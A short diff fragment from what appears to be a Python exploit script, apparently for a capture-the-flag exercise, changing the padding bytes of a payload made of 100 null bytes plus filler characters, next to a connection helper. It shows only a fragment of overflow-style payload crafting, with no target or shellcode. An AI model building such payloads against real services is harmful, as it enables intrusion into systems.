@@ -19,7 +19,7 @@ r = getConn()
 #''')
 
 
-junk="\x47"*2+"\x46"*4
+junk="\x46"*2+"\x46"*4
 pl="\x00"*100+junk
 
 #f=open('x','w')
